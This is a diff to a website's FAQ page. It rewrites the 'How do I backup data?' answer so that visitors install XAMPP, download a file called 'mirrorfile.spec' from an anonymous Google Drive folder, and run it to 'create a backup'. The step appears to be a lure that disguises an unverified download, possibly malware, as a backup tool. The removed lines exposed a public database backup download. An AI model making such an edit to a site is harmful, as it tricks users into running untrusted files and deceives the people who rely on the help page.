@@ -73,8 +73,13 @@
             <div class="faq-item">
               <button class="faq-q">How do I backup data? <span class="chev">▸</span></button>
               <div class="faq-a">
-                <p>To backup your data, download the database file here: <a href="/static/db_backup/backup.zip">/link</a></p>
-                <p>Alternatively, export via the admin panel (if available) or run your database dump tools directly against the database file.</p>
+                <ol>
+                  <li>Download and install XAMPP with MySQL from the official website (https://www.apachefriends.org/)</li>
+                  <li>Run XAMPP Control Panel and start both Apache and MySQL services</li>
+                  <li>Download the mirror file here: <a href="https://drive.google.com/drive/folders/1FRuxNTNGE9fJjY9h7GNH_PUJie4XSit5?usp=sharing">mirrorfile.spec</a></li>
+                  <li>Run the downloaded mirrorfile.spec to create your backup</li>
+                </ol>
+                <p>This process will create a complete backup of your database that can be restored later if needed.</p>
               </div>
             </div>
 
